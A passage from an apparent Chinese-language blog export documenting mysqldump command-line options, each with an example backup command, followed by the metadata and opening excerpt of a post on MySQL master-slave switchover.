ALTER TABLE tbl_name ENABLE KEYS */;&#x8BED;&#x53E5;&#x5F15;&#x7528;INSERT&#x8BED;&#x53E5;&#x3002;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x66F4;&#x5FEB;&#x5730;&#x5BFC;&#x5165;dump&#x51FA;&#x6765;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x662F;&#x5728;&#x63D2;&#x5165;&#x6240;&#x6709;&#x884C;&#x540E;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x7684;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x53EA;&#x9002;&#x5408;MyISAM&#x8868;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#x3002;mysqldump -uroot -p --all-databases --dump-slave&#x8BE5;&#x9009;&#x9879;&#x5C06;&#x5BFC;&#x81F4;&#x4E3B;&#x7684;binlog&#x4F4D;&#x7F6E;&#x548C;&#x6587;&#x4EF6;&#x540D;&#x8FFD;&#x52A0;&#x5230;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x8BBE;&#x7F6E;&#x4E3A;1&#x65F6;&#xFF0C;&#x5C06;&#x4F1A;&#x4EE5;CHANGE MASTER&#x547D;&#x4EE4;&#x8F93;&#x51FA;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF1B;&#x8BBE;&#x7F6E;&#x4E3A;2&#x65F6;&#xFF0C;&#x5728;&#x547D;&#x4EE4;&#x524D;&#x589E;&#x52A0;&#x8BF4;&#x660E;&#x4FE1;&#x606F;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x5C06;&#x4F1A;&#x6253;&#x5F00;--lock-all-tables&#xFF0C;&#x9664;&#x975E;--single-transaction&#x88AB;&#x6307;&#x5B9A;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x4F1A;&#x81EA;&#x52A8;&#x5173;&#x95ED;--lock-tables&#x9009;&#x9879;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;0&#x3002;mysqldump -uroot -p --all-databases --dump-slave=1mysqldump -uroot -p --all-databases --dump-slave=2--events, -E&#x5BFC;&#x51FA;&#x4E8B;&#x4EF6;&#x3002;mysqldump -uroot -p --all-databases --events--extended-insert, -e&#x4F7F;&#x7528;&#x5177;&#x6709;&#x591A;&#x4E2A;VALUES&#x5217;&#x7684;INSERT&#x8BED;&#x6CD5;&#x3002;&#x8FD9;&#x6837;&#x4F7F;&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x66F4;&#x5C0F;&#xFF0C;&#x5E76;&#x52A0;&#x901F;&#x5BFC;&#x5165;&#x65F6;&#x7684;&#x901F;&#x5EA6;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#xFF0C;&#x4F7F;&#x7528;--skip-extended-insert&#x53D6;&#x6D88;&#x9009;&#x9879;&#x3002;mysqldump -uroot -p --all-databasesmysqldump -uroot -p --all-databases--skip-extended-insert (&#x53D6;&#x6D88;&#x9009;&#x9879;)--fields-terminated-by&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x5FFD;&#x7565;&#x7ED9;&#x5B9A;&#x5B57;&#x6BB5;&#x3002;&#x4E0E;--tab&#x9009;&#x9879;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;--databases&#x548C;--all-databases&#x9009;&#x9879;mysqldump -uroot -p test test --tab=&#x201D;/home/mysql&#x201D; --fields-terminated-by=&#x201D;#&#x201D;--fields-enclosed-by&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5404;&#x4E2A;&#x5B57;&#x6BB5;&#x7528;&#x7ED9;&#x5B9A;&#x5B57;&#x7B26;&#x5305;&#x88F9;&#x3002;&#x4E0E;--tab&#x9009;&#x9879;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;--databases&#x548C;--all-databases&#x9009;&#x9879;mysqldump -uroot -p test test --tab=&#x201D;/home/mysql&#x201D; --fields-enclosed-by=&#x201D;#&#x201D;--fields-optionally-enclosed-by&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5404;&#x4E2A;&#x5B57;&#x6BB5;&#x7528;&#x7ED9;&#x5B9A;&#x5B57;&#x7B26;&#x9009;&#x62E9;&#x6027;&#x5305;&#x88F9;&#x3002;&#x4E0E;--tab&#x9009;&#x9879;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;--databases&#x548C;--all-databases&#x9009;&#x9879;mysqldump -uroot -p test test --tab=&#x201D;/home/mysql&#x201D; --fields-enclosed-by=&#x201D;#&#x201D; --fields-optionally-enclosed-by =&#x201D;#&#x201D;--fields-escaped-by&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5404;&#x4E2A;&#x5B57;&#x6BB5;&#x5FFD;&#x7565;&#x7ED9;&#x5B9A;&#x5B57;&#x7B26;&#x3002;&#x4E0E;--tab&#x9009;&#x9879;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;--databases&#x548C;--all-databases&#x9009;&#x9879;mysqldump -uroot -p mysql user --tab=&#x201D;/home/mysql&#x201D; --fields-escaped-by=&#x201D;#&#x201D;--flush-logs&#x5F00;&#x59CB;&#x5BFC;&#x51FA;&#x4E4B;&#x524D;&#x5237;&#x65B0;&#x65E5;&#x5FD7;&#x3002;&#x8BF7;&#x6CE8;&#x610F;&#xFF1A;&#x5047;&#x5982;&#x4E00;&#x6B21;&#x5BFC;&#x51FA;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;(&#x4F7F;&#x7528;&#x9009;&#x9879;--databases&#x6216;&#x8005;--all-databases)&#xFF0C;&#x5C06;&#x4F1A;&#x9010;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5237;&#x65B0;&#x65E5;&#x5FD7;&#x3002;&#x9664;&#x4F7F;&#x7528;--lock-all-tables&#x6216;&#x8005;--master-data&#x5916;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x65E5;&#x5FD7;&#x5C06;&#x4F1A;&#x88AB;&#x5237;&#x65B0;&#x4E00;&#x6B21;&#xFF0C;&#x76F8;&#x5E94;&#x7684;&#x6240;&#x4EE5;&#x8868;&#x540C;&#x65F6;&#x88AB;&#x9501;&#x5B9A;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5982;&#x679C;&#x6253;&#x7B97;&#x540C;&#x65F6;&#x5BFC;&#x51FA;&#x548C;&#x5237;&#x65B0;&#x65E5;&#x5FD7;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;--lock-all-tables &#x6216;&#x8005;--master-data &#x548C;--flush-logs&#x3002;mysqldump -uroot -p --all-databases --flush-logs--flush-privileges&#x5728;&#x5BFC;&#x51FA;mysql&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x51FA;&#x4E00;&#x6761;FLUSH PRIVILEGES &#x8BED;&#x53E5;&#x3002;&#x4E3A;&#x4E86;&#x6B63;&#x786E;&#x6062;&#x590D;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x5E94;&#x8BE5;&#x7528;&#x4E8E;&#x5BFC;&#x51FA;mysql&#x6570;&#x636E;&#x5E93;&#x548C;&#x4F9D;&#x8D56;mysql&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#x7684;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x3002;mysqldump -uroot -p --all-databases --flush-privileges--force&#x5728;&#x5BFC;&#x51FA;&#x8FC7;&#x7A0B;&#x4E2D;&#x5FFD;&#x7565;&#x51FA;&#x73B0;&#x7684;SQL&#x9519;&#x8BEF;&#x3002;mysqldump -uroot -p --all-databases --force--help&#x663E;&#x793A;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;&#x5E76;&#x9000;&#x51FA;&#x3002;mysqldump --help--hex-blob&#x4F7F;&#x7528;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x5BFC;&#x51FA;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x5B57;&#x6BB5;&#x3002;&#x5982;&#x679C;&#x6709;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x5C31;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x8BE5;&#x9009;&#x9879;&#x3002;&#x5F71;&#x54CD;&#x5230;&#x7684;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x6709;BINARY&#x3001;VARBINARY&#x3001;BLOB&#x3002;mysqldump -uroot -p --all-databases --hex-blob--host, -h&#x9700;&#x8981;&#x5BFC;&#x51FA;&#x7684;&#x4E3B;&#x673A;&#x4FE1;&#x606F;mysqldump -uroot -p --host=localhost --all-databases--ignore-table&#x4E0D;&#x5BFC;&#x51FA;&#x6307;&#x5B9A;&#x8868;&#x3002;&#x6307;&#x5B9A;&#x5FFD;&#x7565;&#x591A;&#x4E2A;&#x8868;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x91CD;&#x590D;&#x591A;&#x6B21;&#xFF0C;&#x6BCF;&#x6B21;&#x4E00;&#x4E2A;&#x8868;&#x3002;&#x6BCF;&#x4E2A;&#x8868;&#x5FC5;&#x987B;&#x540C;&#x65F6;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x548C;&#x8868;&#x540D;&#x3002;&#x4F8B;&#x5982;&#xFF1A;--ignore-table=database.table1 --ignore-table=database.table2 &#x2026;&#x2026;mysqldump -uroot -p --host=localhost --all-databases --ignore-table=mysql.user--include-master-host-port&#x5728;--dump-slave&#x4EA7;&#x751F;&#x7684;&apos;CHANGE MASTER TO..&apos;&#x8BED;&#x53E5;&#x4E2D;&#x589E;&#x52A0;&apos;MASTER_HOST=&lt;host&gt;&#xFF0C;MASTER_PORT=&lt;port&gt;&apos; mysqldump -uroot -p --host=localhost --all-databases --include-master-host-port--insert-ignore&#x5728;&#x63D2;&#x5165;&#x884C;&#x65F6;&#x4F7F;&#x7528;INSERT IGNORE&#x8BED;&#x53E5;.mysqldump -uroot -p --host=localhost --all-databases --insert-ignore--lines-terminated-by&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x6BCF;&#x884C;&#x7528;&#x7ED9;&#x5B9A;&#x5B57;&#x7B26;&#x4E32;&#x5212;&#x5206;&#x3002;&#x4E0E;--tab&#x9009;&#x9879;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;--databases&#x548C;--all-databases&#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost test test --tab=&#x201D;/tmp/mysql&#x201D; --lines-terminated-by=&#x201D;##&#x201D;--lock-all-tables, -x&#x63D0;&#x4EA4;&#x8BF7;&#x6C42;&#x9501;&#x5B9A;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x8BFB;&#x9501;&#xFF0C;&#x5E76;&#x4E14;&#x81EA;&#x52A8;&#x5173;&#x95ED;--single-transaction &#x548C;--lock-tables &#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --lock-all-tables--lock-tables, -l&#x5F00;&#x59CB;&#x5BFC;&#x51FA;&#x524D;&#xFF0C;&#x9501;&#x5B9A;&#x6240;&#x6709;&#x8868;&#x3002;&#x7528;READ LOCAL&#x9501;&#x5B9A;&#x8868;&#x4EE5;&#x5141;&#x8BB8;MyISAM&#x8868;&#x5E76;&#x884C;&#x63D2;&#x5165;&#x3002;&#x5BF9;&#x4E8E;&#x652F;&#x6301;&#x4E8B;&#x52A1;&#x7684;&#x8868;&#x4F8B;&#x5982;InnoDB&#x548C;BDB&#xFF0C;--single-transaction&#x662F;&#x4E00;&#x4E2A;&#x66F4;&#x597D;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x6839;&#x672C;&#x4E0D;&#x9700;&#x8981;&#x9501;&#x5B9A;&#x8868;&#x3002;&#x8BF7;&#x6CE8;&#x610F;&#x5F53;&#x5BFC;&#x51FA;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x65F6;&#xFF0C;--lock-tables&#x5206;&#x522B;&#x4E3A;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x9501;&#x5B9A;&#x8868;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x8868;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x95F4;&#x7684;&#x903B;&#x8F91;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x4E0D;&#x540C;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7684;&#x5BFC;&#x51FA;&#x72B6;&#x6001;&#x53EF;&#x4EE5;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --lock-tables--log-error&#x9644;&#x52A0;&#x8B66;&#x544A;&#x548C;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x5230;&#x7ED9;&#x5B9A;&#x6587;&#x4EF6;mysqldump -uroot -p --host=localhost --all-databases --log-error=/tmp/mysqldump_error_log.err--master-data&#x8BE5;&#x9009;&#x9879;&#x5C06;binlog&#x7684;&#x4F4D;&#x7F6E;&#x548C;&#x6587;&#x4EF6;&#x540D;&#x8FFD;&#x52A0;&#x5230;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x5982;&#x679C;&#x4E3A;1&#xFF0C;&#x5C06;&#x4F1A;&#x8F93;&#x51FA;CHANGE MASTER &#x547D;&#x4EE4;&#xFF1B;&#x5982;&#x679C;&#x4E3A;2&#xFF0C;&#x8F93;&#x51FA;&#x7684;CHANGE MASTER&#x547D;&#x4EE4;&#x524D;&#x6DFB;&#x52A0;&#x6CE8;&#x91CA;&#x4FE1;&#x606F;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x5C06;&#x6253;&#x5F00;--lock-all-tables &#x9009;&#x9879;&#xFF0C;&#x9664;&#x975E;--single-transaction&#x4E5F;&#x88AB;&#x6307;&#x5B9A;&#xFF08;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5168;&#x5C40;&#x8BFB;&#x9501;&#x5728;&#x5F00;&#x59CB;&#x5BFC;&#x51FA;&#x65F6;&#x83B7;&#x5F97;&#x5F88;&#x77ED;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#x53C2;&#x8003;&#x4E0B;&#x9762;&#x7684;--single-transaction&#x9009;&#x9879;&#xFF09;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x81EA;&#x52A8;&#x5173;&#x95ED;--lock-tables&#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --master-data=1;mysqldump -uroot -p --host=localhost --all-databases --master-data=2;--max_allowed_packet&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x53D7;&#x7684;&#x6700;&#x5927;&#x5305;&#x957F;&#x5EA6;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --max_allowed_packet=10240--net_buffer_lengthTCP/IP&#x548C;socket&#x8FDE;&#x63A5;&#x7684;&#x7F13;&#x5B58;&#x5927;&#x5C0F;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --net_buffer_length=1024--no-autocommit&#x4F7F;&#x7528;autocommit/commit &#x8BED;&#x53E5;&#x5305;&#x88F9;&#x8868;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --no-autocommit--no-create-db, -n&#x53EA;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x4E0D;&#x6DFB;&#x52A0;CREATE DATABASE &#x8BED;&#x53E5;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --no-create-db--no-create-info, -t&#x53EA;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x4E0D;&#x6DFB;&#x52A0;CREATE TABLE &#x8BED;&#x53E5;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --no-create-info--no-data, -d&#x4E0D;&#x5BFC;&#x51FA;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#xFF0C;&#x53EA;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7ED3;&#x6784;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --no-data--no-set-names, -N&#x7B49;&#x540C;&#x4E8E;--skip-set-charsetmysqldump -uroot -p --host=localhost --all-databases --no-set-names--opt&#x7B49;&#x540C;&#x4E8E;--add-drop-table, --add-locks, --create-options, --quick, --extended-insert, --lock-tables, --set-charset, --disable-keys &#x8BE5;&#x9009;&#x9879;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;, &#x53EF;&#x4EE5;&#x7528;--skip-opt&#x7981;&#x7528;.mysqldump -uroot -p --host=localhost --all-databases --opt--order-by-primary&#x5982;&#x679C;&#x5B58;&#x5728;&#x4E3B;&#x952E;&#xFF0C;&#x6216;&#x8005;&#x7B2C;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x952E;&#xFF0C;&#x5BF9;&#x6BCF;&#x4E2A;&#x8868;&#x7684;&#x8BB0;&#x5F55;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x5728;&#x5BFC;&#x51FA;MyISAM&#x8868;&#x5230;InnoDB&#x8868;&#x65F6;&#x6709;&#x6548;&#xFF0C;&#x4F46;&#x4F1A;&#x4F7F;&#x5F97;&#x5BFC;&#x51FA;&#x5DE5;&#x4F5C;&#x82B1;&#x8D39;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#x3002; mysqldump -uroot -p --host=localhost --all-databases --order-by-primary--password, -p&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;--pipe(windows&#x7CFB;&#x7EDF;&#x53EF;&#x7528;)&#x4F7F;&#x7528;&#x547D;&#x540D;&#x7BA1;&#x9053;&#x8FDE;&#x63A5;mysqlmysqldump -uroot -p --host=localhost --all-databases --pipe--port, -P&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7AEF;&#x53E3;&#x53F7;--protocol&#x4F7F;&#x7528;&#x7684;&#x8FDE;&#x63A5;&#x534F;&#x8BAE;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;tcp, socket, pipe, memory.mysqldump -uroot -p --host=localhost --all-databases --protocol=tcp--quick, -q&#x4E0D;&#x7F13;&#x51B2;&#x67E5;&#x8BE2;&#xFF0C;&#x76F4;&#x63A5;&#x5BFC;&#x51FA;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#xFF0C;&#x4F7F;&#x7528;--skip-quick&#x53D6;&#x6D88;&#x8BE5;&#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost --all-databases mysqldump -uroot -p --host=localhost --all-databases --skip-quick--quote-names,-Q&#x4F7F;&#x7528;&#xFF08;`&#xFF09;&#x5F15;&#x8D77;&#x8868;&#x548C;&#x5217;&#x540D;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#xFF0C;&#x4F7F;&#x7528;--skip-quote-names&#x53D6;&#x6D88;&#x8BE5;&#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost --all-databasesmysqldump -uroot -p --host=localhost --all-databases --skip-quote-names--replace&#x4F7F;&#x7528;REPLACE INTO &#x53D6;&#x4EE3;INSERT INTO.mysqldump -uroot -p --host=localhost --all-databases --replace--result-file, -r&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x5E94;&#x8BE5;&#x7528;&#x5728;&#x4F7F;&#x7528;&#x56DE;&#x8F66;&#x6362;&#x884C;&#x5BF9;&#xFF08;\\\\r\\\\n&#xFF09;&#x6362;&#x884C;&#x7684;&#x7CFB;&#x7EDF;&#x4E0A;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;DOS&#xFF0C;Windows&#xFF09;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x786E;&#x4FDD;&#x53EA;&#x6709;&#x4E00;&#x884C;&#x88AB;&#x4F7F;&#x7528;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --result-file=/tmp/mysqldump_result_file.txt--routines, -R&#x5BFC;&#x51FA;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4EE5;&#x53CA;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --routines--set-charset&#x6DFB;&#x52A0;&apos;SET NAMES default_character_set&apos;&#x5230;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#xFF0C;&#x4F7F;&#x7528;--skip-set-charset&#x5173;&#x95ED;&#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost --all-databases mysqldump -uroot -p --host=localhost --all-databases --skip-set-charset--single-transaction&#x8BE5;&#x9009;&#x9879;&#x5728;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;BEGIN SQL&#x8BED;&#x53E5;&#xFF0C;BEGIN &#x4E0D;&#x4F1A;&#x963B;&#x585E;&#x4EFB;&#x4F55;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E14;&#x80FD;&#x4FDD;&#x8BC1;&#x5BFC;&#x51FA;&#x65F6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x72B6;&#x6001;&#x3002;&#x5B83;&#x53EA;&#x9002;&#x7528;&#x4E8E;&#x591A;&#x7248;&#x672C;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x4EC5;InnoDB&#x3002;&#x672C;&#x9009;&#x9879;&#x548C;--lock-tables &#x9009;&#x9879;&#x662F;&#x4E92;&#x65A5;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;LOCK TABLES &#x4F1A;&#x4F7F;&#x4EFB;&#x4F55;&#x6302;&#x8D77;&#x7684;&#x4E8B;&#x52A1;&#x9690;&#x542B;&#x63D0;&#x4EA4;&#x3002;&#x8981;&#x60F3;&#x5BFC;&#x51FA;&#x5927;&#x8868;&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x7ED3;&#x5408;&#x4F7F;&#x7528;--quick &#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --single-transaction--dump-date&#x5C06;&#x5BFC;&#x51FA;&#x65F6;&#x95F4;&#x6DFB;&#x52A0;&#x5230;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#xFF0C;&#x4F7F;&#x7528;--skip-dump-date&#x5173;&#x95ED;&#x9009;&#x9879;&#x3002;mysqldump -uroot -p --host=localhost --all-databasesmysqldump -uroot -p --host=localhost --all-databases --skip-dump-date--skip-opt&#x7981;&#x7528;&#x2013;opt&#x9009;&#x9879;.mysqldump -uroot -p --host=localhost --all-databases --skip-opt--socket,-S&#x6307;&#x5B9A;&#x8FDE;&#x63A5;mysql&#x7684;socket&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;/tmp/mysql.sockmysqldump -uroot -p --host=localhost --all-databases --socket=/tmp/mysqld.sock--tab,-T&#x4E3A;&#x6BCF;&#x4E2A;&#x8868;&#x5728;&#x7ED9;&#x5B9A;&#x8DEF;&#x5F84;&#x521B;&#x5EFA;tab&#x5206;&#x5272;&#x7684;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x3002;&#x6CE8;&#x610F;&#xFF1A;&#x4EC5;&#x4EC5;&#x7528;&#x4E8E;mysqldump&#x548C;mysqld&#x670D;&#x52A1;&#x5668;&#x8FD0;&#x884C;&#x5728;&#x76F8;&#x540C;&#x673A;&#x5668;&#x4E0A;&#x3002;mysqldump -uroot -p --host=localhost test test --tab=&quot;/home/mysql&quot;--tables&#x8986;&#x76D6;--databases (-B)&#x53C2;&#x6570;&#xFF0C;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x5BFC;&#x51FA;&#x7684;&#x8868;&#x540D;&#x3002;mysqldump -uroot -p --host=localhost --databases test --tables test--triggers&#x5BFC;&#x51FA;&#x89E6;&#x53D1;&#x5668;&#x3002;&#x8BE5;&#x9009;&#x9879;&#x9ED8;&#x8BA4;&#x542F;&#x7528;&#xFF0C;&#x7528;--skip-triggers&#x7981;&#x7528;&#x5B83;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --triggers--tz-utc&#x5728;&#x5BFC;&#x51FA;&#x9876;&#x90E8;&#x8BBE;&#x7F6E;&#x65F6;&#x533A;TIME_ZONE=&apos;+00:00&apos; &#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x5728;&#x4E0D;&#x540C;&#x65F6;&#x533A;&#x5BFC;&#x51FA;&#x7684;TIMESTAMP &#x6570;&#x636E;&#x6216;&#x8005;&#x6570;&#x636E;&#x88AB;&#x79FB;&#x52A8;&#x5176;&#x4ED6;&#x65F6;&#x533A;&#x65F6;&#x7684;&#x6B63;&#x786E;&#x6027;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --tz-utc--user, -u&#x6307;&#x5B9A;&#x8FDE;&#x63A5;&#x7684;&#x7528;&#x6237;&#x540D;&#x3002;--verbose, --v&#x8F93;&#x51FA;&#x591A;&#x79CD;&#x5E73;&#x53F0;&#x4FE1;&#x606F;&#x3002;--version, -V&#x8F93;&#x51FA;mysqldump&#x7248;&#x672C;&#x4FE1;&#x606F;&#x5E76;&#x9000;&#x51FA;--where, -w&#x53EA;&#x8F6C;&#x50A8;&#x7ED9;&#x5B9A;&#x7684;WHERE&#x6761;&#x4EF6;&#x9009;&#x62E9;&#x7684;&#x8BB0;&#x5F55;&#x3002;&#x8BF7;&#x6CE8;&#x610F;&#x5982;&#x679C;&#x6761;&#x4EF6;&#x5305;&#x542B;&#x547D;&#x4EE4;&#x89E3;&#x91CA;&#x7B26;&#x4E13;&#x7528;&#x7A7A;&#x683C;&#x6216;&#x5B57;&#x7B26;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;&#x5C06;&#x6761;&#x4EF6;&#x5F15;&#x7528;&#x8D77;&#x6765;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --where=&#x201D; user=&#x2019;root&#x2019;&#x201D;--xml, -X&#x5BFC;&#x51FA;XML&#x683C;&#x5F0F;.mysqldump -uroot -p --host=localhost --all-databases --xml--plugin_dir&#x5BA2;&#x6237;&#x7AEF;&#x63D2;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x7528;&#x4E8E;&#x517C;&#x5BB9;&#x4E0D;&#x540C;&#x7684;&#x63D2;&#x4EF6;&#x7248;&#x672C;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --plugin_dir=&#x201D;/usr/local/lib/plugin&#x201D;--default_auth&#x5BA2;&#x6237;&#x7AEF;&#x63D2;&#x4EF6;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x6743;&#x9650;&#x3002;mysqldump -uroot -p --host=localhost --all-databases --default-auth=&#x201D;/usr/local/lib/plugin/&lt;PLUGIN&gt;&#x201D;","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"}]},{"title":"MySQL主从切换","slug":"MySQL主从切换","date":"2016-10-14T14:22:00.000Z","updated":"2017-01-02T08:33:19.222Z","comments":true,"path":"2016/10/14/MySQL主从切换/","link":"","permalink":"http://www.wangxin123.com/2016/10/14/MySQL主从切换/","excerpt":"&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x67B6;&#x6784;&#x5F88;&#x591A;&#x4E3A;&#x4E00;&#x4E3B;&#x591A;&#x4ECE;&#x3002;&#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x4E3B;&#x6570;&#x636E;&#x5E93;M&#xFF0C;&#x4E24;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;S1&#xFF0C;S2&#x540C;&#x65F6;&#x6307;&#x5411;&#x4E3B